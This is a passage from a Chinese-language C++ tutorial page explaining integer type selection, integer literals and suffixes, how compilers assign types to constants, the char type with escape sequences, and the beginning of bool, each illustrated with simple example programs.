混合使用有符号和无符号整数进行运算时要特别小心，因为有符号数可能会被隐式转换为无符号数，导致意外的结果，尤其是在比较运算中。</p><h2 id="3-1-5-选择整型类型"><a href="#3-1-5-选择整型类型" class="headerlink" title="3.1.5 选择整型类型"></a>3.1.5 选择整型类型</h2><p>在选择使用哪种整型类型时，应考虑以下因素：</p><ol><li> <strong>数值范围:</strong> 确保所选类型能够容纳你程序中需要存储的最大（和最小，如果是有符号）整数值。如果数值可能很大，优先考虑 <code>long</code> 或 <code>long long</code>。如果数值永远非负，可以考虑 <code>unsigned</code> 版本以获得更大的正数范围。</li><li> <strong>内存消耗:</strong> 如果内存非常宝贵（例如在嵌入式系统或处理大量数据时），并且确定数值范围较小，可以使用 <code>short</code> 来节省内存。</li><li> <strong>性能:</strong> <code>int</code> 通常被认为是计算机处理效率最高的整数类型。除非有明确的范围或内存需求，否则 <code>int</code> 是一个不错的默认选择。</li><li> <strong>可移植性:</strong> <code>int</code> 的大小可能因系统而异。如果需要确保在不同系统上具有固定的大小，可以使用 C++11 引入的固定宽度整数类型（在 <code>&lt;cstdint&gt;</code> 头文件中定义），例如 <code>int16_t</code>, <code>uint32_t</code>, <code>int64_t</code> 等。</li><li> <strong>代码清晰度:</strong> 选择最能自然表达意图的类型。如果变量代表一个永远不会为负的计数，<code>unsigned int</code> 可能比 <code>int</code> 更能表达这个意图。</li></ol><p><strong>一般建议:</strong></p><ul><li>  如果不需要存储负数，且需要更大的正数范围，或者变量逻辑上就是无符号的（如计数），使用 <code>unsigned</code>。</li><li>  如果数值范围不大，且没有特殊内存或性能要求，<code>int</code> 是最常用的选择。</li><li>  如果 <code>int</code> 可能不够大，使用 <code>long long</code>。<code>long</code> 在某些系统上可能和 <code>int</code> 大小相同，而 <code>long long</code> 保证至少64位。</li><li>  只有在内存非常受限且确定数值很小时才使用 <code>short</code>。</li><li>  为了明确性和跨平台兼容性，可以考虑使用 <code>&lt;cstdint&gt;</code> 中的固定宽度类型。</li></ul><p><strong>用法与示例 (选择):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdint&gt; // 包含固定宽度整数类型</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 场景 1: 存储学生年龄 (通常不大，非负)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> studentAge = <span class="number">20</span>; <span class="comment">// unsigned int 或 int 都可以，unsigned 更明确非负</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 场景 2: 循环计数器 (通常用 int)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 场景 3: 存储文件大小 (可能非常大，非负)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fileSize = <span class="number">5000000000U</span>LL; <span class="comment">// 需要大范围，非负</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 场景 4: 需要精确 32 位有符号整数 (跨平台)</span></span><br><span class="line">    <span class="keyword">int32_t</span> preciseCounter = <span class="number">-123456789</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 场景 5: 内存受限，存储少量选项 (0-100)</span></span><br><span class="line">    <span class="comment">// short optionCode = 5; // 如果 short 足够且内存关键</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; studentAge &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;File Size: &quot;</span> &lt;&lt; fileSize &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Precise Counter: &quot;</span> &lt;&lt; preciseCounter &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-1-6-整型字面值"><a href="#3-1-6-整型字面值" class="headerlink" title="3.1.6 整型字面值"></a>3.1.6 整型字面值</h2><p><strong>整型字面值 (Integer Literal)</strong> 是直接写在代码中的整数常量，例如 <code>10</code>, <code>0</code>, <code>-5</code>, <code>42</code>。C++允许以不同的进制（基数）书写整型字面值：</p><ol><li> <strong>十进制 (Decimal):</strong> 最常见的形式，以非零数字开头（除非是数字0本身）。例如：<code>10</code>, <code>255</code>, <code>0</code>, <code>12345</code>。</li><li> <strong>八进制 (Octal):</strong> 以 <code>0</code> 开头。只包含数字 0-7。例如：<code>012</code> (等于十进制的 10)，<code>077</code> (等于十进制的 63)。现代C++中应谨慎使用，容易与十进制混淆。</li><li> <strong>十六进制 (Hexadecimal):</strong> 以 <code>0x</code> 或 <code>0X</code> 开头。包含数字 0-9 和字母 a-f (或 A-F)，大小写不敏感。例如：<code>0xA</code> (等于十进制的 10)，<code>0xFF</code> (等于十进制的 255)，<code>0x1a2b</code>。常用于表示内存地址或位模式。</li><li> <strong>二进制 (Binary) (C++14):</strong> 以 <code>0b</code> 或 <code>0B</code> 开头。只包含数字 0 和 1。例如：<code>0b1010</code> (等于十进制的 10)，<code>0b11111111</code> (等于十进制的 255)。</li></ol><p><strong>后缀 (Suffixes):</strong></p><p>可以通过在字面值后面添加后缀来显式指定其类型：</p><ul><li>  <code>u</code> 或 <code>U</code>: 表示 <code>unsigned</code> 类型 (<code>unsigned int</code>, <code>unsigned long</code>, <code>unsigned long long</code>)。</li><li>  <code>l</code> 或 <code>L</code>: 表示 <code>long</code> 或 <code>unsigned long</code> 类型。</li><li>  <code>ll</code> 或 <code>LL</code>: 表示 <code>long long</code> 或 <code>unsigned long long</code> 类型 (C++11)。</li></ul><p>后缀可以组合使用，例如 <code>ul</code>, <code>UL</code>, <code>ull</code>, <code>ULL</code>, <code>lu</code>, <code>llu</code> 等（顺序和大小写不重要）。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> decimal_val = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> octal_val = <span class="number">0144</span>;   <span class="comment">// 1*64 + 4*8 + 4*1 = 64 + 32 + 4 = 100 (十进制)</span></span><br><span class="line">    <span class="keyword">int</span> hex_val = <span class="number">0x64</span>;     <span class="comment">// 6*16 + 4*1 = 96 + 4 = 100 (十进制)</span></span><br><span class="line">    <span class="comment">// int binary_val = 0b1100100; // C++14: 64 + 32 + 4 = 100 (十进制)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Decimal: &quot;</span> &lt;&lt; decimal_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Octal (0144): &quot;</span> &lt;&lt; octal_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hexadecimal (0x64): &quot;</span> &lt;&lt; hex_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Binary (0b1100100): &quot; &lt;&lt; binary_val &lt;&lt; std::endl; // 需要 C++14 编译器</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用后缀</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> u_val = <span class="number">100U</span>;</span><br><span class="line">    <span class="keyword">long</span> l_val = <span class="number">200000L</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ul_val = <span class="number">300000U</span>L;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ll_val = <span class="number">4000000000L</span>L;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ull_val = <span class="number">5000000000U</span>LL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned int: &quot;</span> &lt;&lt; u_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Long: &quot;</span> &lt;&lt; l_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned long: &quot;</span> &lt;&lt; ul_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Long long: &quot;</span> &lt;&lt; ll_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned long long: &quot;</span> &lt;&lt; ull_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-1-7-C-如何确定常量的类型"><a href="#3-1-7-C-如何确定常量的类型" class="headerlink" title="3.1.7 C++如何确定常量的类型"></a>3.1.7 C++如何确定常量的类型</h2><p>当你写下一个整型字面值（常量）而没有指定后缀时，C++编译器会根据其值来推断其类型。</p><p><strong>规则:</strong></p><ol><li><strong>十进制常量:</strong> 编译器会选择能容纳该值的最小的有符号类型，依次尝试：<code>int</code>, <code>long</code>, <code>long long</code> (C++11)。例如：<ul><li>  <code>100</code> 会被认为是 <code>int</code> (如果 <code>int</code> 能容纳)。</li><li>  <code>3000000000</code> 会被认为是 <code>long</code> (如果 <code>int</code> 不能容纳但 <code>long</code> 可以)，或者 <code>long long</code> (如果 <code>int</code> 和 <code>long</code> 都不能容纳但 <code>long long</code> 可以)。</li></ul></li><li> <strong>八进制或十六进制常量:</strong> 编译器会选择能容纳该值的最小类型，依次尝试：<code>int</code>, <code>unsigned int</code>, <code>long</code>, <code>unsigned long</code>, <code>long long</code> (C++11), <code>unsigned long long</code> (C++11)。注意这里包含了 <code>unsigned</code> 类型。</li></ol><p><strong>为什么要知道这个?</strong></p><p>这在涉及类型转换和函数重载时可能很重要。如果你传递一个常量给函数，它的默认类型可能会影响哪个重载版本被调用。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // 用于 typeid (仅作演示)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing int: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing unsigned int: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">long</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing long: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing unsigned long: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> n)</span> </span>&#123; <span class="comment">// C++11</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing long long: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> n)</span> </span>&#123; <span class="comment">// C++11</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing unsigned long long: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 100: &quot;</span>;</span><br><span class="line">    process(<span class="number">100</span>); <span class="comment">// 通常调用 process(int)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 假设 int 是 32 位，最大值约 21 亿</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3000000000: &quot;</span>; </span><br><span class="line">    <span class="comment">// 如果 int 是 32 位，这个值超出了 int 范围</span></span><br><span class="line">    <span class="comment">// 编译器会尝试 long 或 long long</span></span><br><span class="line">    process(<span class="number">3000000000</span>); <span class="comment">// 可能调用 process(long) 或 process(long long)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 0xFFFFFFFF: &quot;</span>; </span><br><span class="line">    <span class="comment">// 这个十六进制数 (等于 4294967295)</span></span><br><span class="line">    <span class="comment">// 如果 int 是 32 位，它超出了有符号 int 的范围</span></span><br><span class="line">    <span class="comment">// 编译器会尝试 unsigned int, long, unsigned long...</span></span><br><span class="line">    process(<span class="number">0xFFFFFFFF</span>); <span class="comment">// 可能调用 process(unsigned int) 或 process(unsigned long)等</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用后缀明确类型</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 150L: &quot;</span>;</span><br><span class="line">    process(<span class="number">150L</span>); <span class="comment">// 明确调用 process(long)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 200U: &quot;</span>;</span><br><span class="line">    process(<span class="number">200U</span>); <span class="comment">// 明确调用 process(unsigned int)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 5000000000LL: &quot;</span>;</span><br><span class="line">    process(<span class="number">5000000000L</span>L); <span class="comment">// 明确调用 process(long long)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键点:</strong> 如果不确定常量会被推断成什么类型，或者想要确保它是特定类型，最好使用后缀。</p><h2 id="3-1-8-char类型：字符和小整数"><a href="#3-1-8-char类型：字符和小整数" class="headerlink" title="3.1.8 char类型：字符和小整数"></a>3.1.8 char类型：字符和小整数</h2><p><code>char</code> 类型是另一种整型类型，它被设计用来存储**字符 (character)**，例如字母、数字、标点符号等。</p><p><strong>特点:</strong></p><ul><li>  <strong>大小:</strong> <code>char</code> 通常占用 1 个字节（8位）的内存。这是C++标准保证的 (<code>sizeof(char)</code> 总是 1)。</li><li>  <strong>字符表示:</strong> 计算机内部使用数值编码（如 ASCII 或 Unicode 的子集）来表示字符。<code>char</code> 变量存储的是这些字符对应的整数编码。</li><li>  <strong>字符字面值:</strong> 使用单引号 <code>&#39; &#39;</code> 括起来表示单个字符字面值，例如 <code>&#39;A&#39;</code>, <code>&#39;a&#39;</code>, <code>&#39;5&#39;</code>, <code>&#39;?&#39;</code>, <code>&#39;\n&#39;</code> (换行符)。</li><li>  <strong>整数类型:</strong> <code>char</code> 本质上仍然是一个整数类型。它可以参与算术运算。</li><li><strong>有符号 vs 无符号:</strong> <code>char</code> 类型具体是有符号 (<code>signed char</code>) 还是无符号 (<code>unsigned char</code>) 取决于编译器实现。如果你需要明确，可以直接使用 <code>signed char</code> 或 <code>unsigned char</code>。<ul><li>  <code>signed char</code>: 范围通常是 -128 到 127。</li><li>  <code>unsigned char</code>: 范围通常是 0 到 255。</li></ul></li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> grade = <span class="string">&#x27;A&#x27;</span>; <span class="comment">// 存储字符 &#x27;A&#x27;</span></span><br><span class="line">    <span class="keyword">char</span> initial = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> symbol = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> newline = <span class="string">&#x27;\n&#x27;</span>; <span class="comment">// 存储换行符 (转义序列)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Your grade is: &quot;</span> &lt;&lt; grade &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial: &quot;</span> &lt;&lt; initial &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Symbol: &quot;</span> &lt;&lt; symbol &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing a newline:&quot;</span> &lt;&lt; newline; <span class="comment">// 输出一个换行</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After newline.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cout 会将 char 类型解释为字符进行打印</span></span><br><span class="line">    <span class="comment">// 如果想看到字符对应的整数编码，需要进行类型转换</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The integer code for &#x27;A&#x27; is: &quot;</span> &lt;&lt; <span class="keyword">int</span>(grade) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The integer code for &#x27;$&#x27; is: &quot;</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(symbol) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// char 作为小整数使用</span></span><br><span class="line">    <span class="keyword">char</span> small_num = <span class="number">65</span>; <span class="comment">// 65 是 ASCII 码中 &#x27;A&#x27; 的值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Character with code 65: &quot;</span> &lt;&lt; small_num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算术运算</span></span><br><span class="line">    <span class="keyword">char</span> next_char = grade + <span class="number">1</span>; <span class="comment">// &#x27;A&#x27; 的编码加 1 得到 &#x27;B&#x27; 的编码</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Character after &#x27;A&#x27;: &quot;</span> &lt;&lt; next_char &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &#x27;B&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输入字符</span></span><br><span class="line">    <span class="keyword">char</span> response;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a character: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; response; <span class="comment">// 读取一个字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; response &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Its code is: &quot;</span> &lt;&lt; <span class="keyword">int</span>(response) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 明确使用 signed/unsigned char</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">char</span> sc = <span class="number">-5</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> uc = <span class="number">250</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Signed char: &quot;</span> &lt;&lt; <span class="keyword">int</span>(sc) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 转换为 int 打印数值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned char: &quot;</span> &lt;&lt; <span class="keyword">int</span>(uc) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>转义序列 (Escape Sequence):</strong><br>以反斜杠 <code>\</code> 开头的特殊字符序列，用于表示无法直接输入的字符或具有特殊含义的字符。常用转义序列包括：</p><ul><li>  <code>\n</code>: 换行符</li><li>  <code>\t</code>: 水平制表符 (Tab)</li><li>  <code>\r</code>: 回车符</li><li>  <code>\\</code>: 反斜杠本身</li><li>  <code>\&#39;</code>: 单引号</li><li>  <code>\&quot;</code>: 双引号</li><li>  <code>\?</code>: 问号</li><li>  <code>\0</code>: 空字符 (Null character)</li><li>  <code>\xhh</code>: 用两位十六进制数 hh 表示字符</li><li>  <code>\ooo</code>: 用最多三位八进制数 ooo 表示字符</li></ul><h2 id="3-1-9-bool类型"><a href="#3-1-9-bool类型" class="headerlink" title="3.1.9 bool类型"></a>3.1.9 bool类型</h2><p><code>bool</code> 类型是C++中的<strong>布尔 (Boolean)</strong> 类型，用于表示逻辑值：<strong>真 (true)</strong> 或 **假 (false)**。</p><p><strong>特点:</strong></p><ul><li>  <strong>取值:</strong> <code>bool</code> 变量只能存储两个值：<code>true</code> 和 <code>false</code>。这两个是C++关键字。</li><li><strong>整数转换:</strong><ul><li>  在需要整数的地方，<code>true</code> 会被转换为 <code>1</code>，<code>false</code> 会被转换为 <code>0</code>。</li><li>  在需要布尔值的地方，任何非零整数值会被转换为 <code>true</code>，零值会被转换为 <code>false</code>。指针类型也可以转换为 <code>bool</code>（空指针为 <code>false</code>，非空指针为 <code>true</code>）。</li></ul></li><li>  <strong>大小:</strong> <code>bool</code> 类型的大小没有严格规定，但通常是 1 个字节，即使它只需要 1 位来存储信息。</li><li>  <strong>用途:</strong> 主要用于存储条件判断（如 <code>if</code> 语句、循环条件）的结果。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 